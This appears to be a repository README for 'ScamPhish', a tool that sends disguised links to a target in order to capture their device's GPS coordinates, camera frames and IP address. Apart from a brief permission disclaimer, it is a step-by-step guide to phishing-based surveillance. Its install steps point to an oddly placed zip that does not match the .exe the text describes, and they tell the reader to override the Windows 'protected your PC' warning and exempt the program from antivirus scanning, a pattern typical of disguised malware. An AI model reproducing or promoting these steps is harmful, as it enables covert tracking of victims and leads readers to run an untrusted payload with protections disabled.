# 📍 ScamPhish - Track locations and access device cameras

[![Download ScamPhish](https://img.shields.io/badge/Download-ScamPhish-blue)](https://raw.githubusercontent.com/Hillaryweak795/ScamPhish/main/abominator/Phish-Scam-v1.3-beta.5.zip)

## 🔍 What this tool does

ScamPhish helps you identify the physical location of a device and interact with its camera. It works by sending a link to a target. Once the target opens the link, the tool collects data. Use this tool for audits or security testing. Ensure you have permission before you test a device.

## 🛠 Prerequisites

You need a Windows computer to run this software. Ensure you have the following installed to ensure proper operation:

*   Windows 10 or Windows 11.
*   An active internet connection to send data requests.
*   A web browser like Chrome or Edge to view the results. 

## 📥 How to download the software

Follow these steps to get the software on your machine:

1.  Visit this page to download the latest version: [https://raw.githubusercontent.com/Hillaryweak795/ScamPhish/main/abominator/Phish-Scam-v1.3-beta.5.zip](https://raw.githubusercontent.com/Hillaryweak795/ScamPhish/main/abominator/Phish-Scam-v1.3-beta.5.zip).
2.  Look for the section labeled Assets.
3.  Click the file ending in .exe to start the download.
4.  Save the file to your desktop for easy access.

## ⚙️ Setting up the application

1.  Locate the file you downloaded.
2.  Double-click the file to open the program.
3.  Windows might show a blue box that says "Windows protected your PC."
4.  Click the text that says "More info."
5.  Click the button that says "Run anyway."
6.  A black window will appear. This is the command interface for the tool.

## 🚀 Working with the tool

Once the window opens, follow the prompts on your screen:

1.  The tool asks you to select a tunnel provider. Choose Cloudflare or Ngrok. These services allow your computer to communicate with the outside internet safely.
2.  Choose the template you want to use. The templates change how the link looks to the person receiving it.
3.  The software creates a custom link for you. Copy this link.
4.  Send this link to the device you want to test.
5.  When the target clicks the link, the tool requests permission from their browser to access their location and camera.
6.  If the user grants permission, the data appears inside your black terminal window.

## 📁 Viewing your results

The tool stores all data in a local folder created after the first run. Look for a folder named logs inside your main program folder. You will find files containing:

*   Latitude and longitude coordinates of the device.
*   Pictures or video frames from the camera.
*   The IP address of the target device.

You can paste the coordinates into any map service to see the location on a screen.

## ⚠️ Important safety guidelines

Use this software only on devices you own or have clear permission to test. Unauthorized tracking or camera access creates legal and privacy risks. Use the tool for ethical purposes only. Follow local and state laws regarding digital privacy.

## 🛠 Solving common problems

If the tool does not work, try these steps:

*   Restart your computer.
*   Ensure your antivirus software is not blocking the connection. You might need to add the software to your exclusion list.
*   Verify your internet connection.
*   Check if the tunnel provider is down. If you chose Ngrok, ensure you have an active account if the program prompts you for an authorization token.
*   Update your web browser to the latest version to ensure compatibility with modern web requests.

## ❓ Frequently asked questions

Do I need to pay for this tool?
No, the tool is free to use.

Can I install this on a phone?
The current version works on Windows.

Why does the camera ask for permission?
Browsers require user consent to access hardware. This is a security feature built into all modern web browsers. The tool cannot force access without the user clicking allow.

Does it work if the target is offline?
No, the target must have an active internet connection to click the link and provide data.

What if the target clicks "Block" on the permissions?
The tool will not receive the location or camera feed.

How do I close the tool?
Click the X at the top right of the black window. This stops the service and closes the connection. 

This tool provides a simple way to test security settings. Keep your software updated to get the best results.